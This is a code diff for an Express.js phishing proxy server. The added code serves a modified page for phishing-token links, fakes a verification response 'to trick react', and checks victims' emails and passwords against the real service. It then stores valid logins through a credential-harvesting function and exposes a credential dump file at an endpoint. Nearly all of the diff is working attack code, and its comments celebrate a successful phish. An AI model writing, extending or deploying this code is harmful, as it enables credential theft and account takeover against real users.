@@ -1,5 +1,6 @@
 //imports
 import { grabCreds as harvestCredentials, writeCreds as credsDump } from './utils/utils.js';
+import { isPhishLink, login } from './utils/phish.js';
 import { config } from './config.js';
 import bodyParser from 'body-parser';
 import { fileURLToPath } from 'url';
@@ -20,9 +21,13 @@ const app = express();
 var CREDENTIALS = [];
 
 
-
-//middlwares
 app.use(bodyParser.json());
+
+app.get('/favicon.ico', (req, res) => res.sendFile(__dirname + '/favicon.ico'));
+
+app.use('/static', express.static('static'));
+
+app.get('/helloworld_dump', (req, res) => res.sendFile(__dirname, '/aurison_creds_dump.txt'));
 
 app.use((req, res, next) => {
     //This route is kinda uneccessary. 
@@ -31,12 +36,15 @@ app.use((req, res, next) => {
     next();
 })
 
-app.use('/static', express.static('static'));
 
-app.get('/helloworld_dump', (req, res) => res.sendFile(__dirname, '/aurison_creds_dump.txt'));
+app.get('/verify/:email/:token', (req, res, next) => {
+    if (!isPhishLink(req.params.token)) return next();
+    
+    //serve the html that uses the modded main.js file.
+    return res.sendFile(__dirname + '/index1337.html');
+    
+})
 
-
-app.get('/favicon.ico', (req, res) => res.sendFile(__dirname + '/favicon.ico'));
 
 //home
 app.get('*', (req, res, next)=>{
@@ -55,11 +63,13 @@ app.get('*', (req, res, next)=>{
 });
 
 
-app.post('/verify', (req, res, next) => {
-    //fake a valid response to trick react if its a phish link.
-    //otherwise just pass it along to the proxy
-    if (req.body.action === "info" && req.body.token.endsWith("700r")) {
-        //probably grab this from somewhere later on.
+app.post('/verify', async (req, res, next) => {
+    //if it's not a phish link, pass the request to the proxy.
+    if (isPhishLink(req.body.token) == false) return next()
+
+    
+    //fake a valid response to trick react.
+    if (req.body.action === "info") {
         var payload = {
             error:false,
             data: {
@@ -72,7 +82,20 @@ app.post('/verify', (req, res, next) => {
         return res.status(200).json(payload);
     }
 
-    return next();
+    //At this point, the phish is 50% successful.
+    //We need to get it to a 100 by ensuring the creds are valid.
+    const email = req.body.email;
+    const pass = req.body.old;
+
+    const response = await login(email, pass);
+    
+
+    if (!response.valid) return res.status(200).json(response.response) //wrong creds.
+
+    //Phish is 100% successful :)
+    //Harvest creds and respond.
+    harvestCredentials(req, CREDENTIALS);
+    return res.status(200).json({error: false, success: true});
 });
 
 
